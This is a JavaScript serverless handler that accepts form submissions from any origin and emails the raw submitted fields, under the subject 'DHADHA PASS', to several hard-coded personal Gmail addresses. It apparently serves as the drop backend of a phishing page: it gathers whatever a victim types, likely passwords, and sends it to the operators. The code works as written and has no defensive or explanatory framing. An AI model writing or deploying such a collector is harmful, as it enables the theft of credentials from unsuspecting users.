import { transporter } from "./emailConfig.js";

export default async function handler(req, res) {
  // ✅ CORS headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "Content-Type, Accept, Authorization"
  );

  // ✅ Handle preflight OPTIONS request
  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  let formData = {};

  try {
    if (typeof req.body === "string") {
      formData = JSON.parse(req.body);
    } else {
      formData = req.body;
    }
  } catch (err) {
    return res.status(400).json({ error: "Invalid JSON" });
  }

  if (!formData || Object.keys(formData).length === 0) {
    return res.status(400).json({ error: "Form data missing" });
  }

  // ✅ Unique time stamp for every email
  const sentTime = new Date().toLocaleString();
  const uniqueSubject = `DHADHA PASS - ${Date.now()}`;

  try {
    await transporter.sendMail({
      from: `"PROFESSOR" <hgfver414@gmail.com>`,
      to: "mahboobalinizamani@gmail.com,newemail@example.com,nizamaniallahabad@gmail.com",
      subject: uniqueSubject,
      text: `${JSON.stringify(formData, null, 2)}\n\nSent at: ${sentTime}`,
      html: `<h3>Professor Link</h3>
             <pre>${JSON.stringify(formData, null, 2)}</pre>
             <p><strong>Sent at:</strong> ${sentTime}</p>`,
    });

    res
      .status(200)
      .json({ success: true, message: "Data sent via email (Asif)" });
  } catch (error) {
    console.error("Email send error:", error);
    res.status(500).json({ error: "Failed to send email" });
  }
}
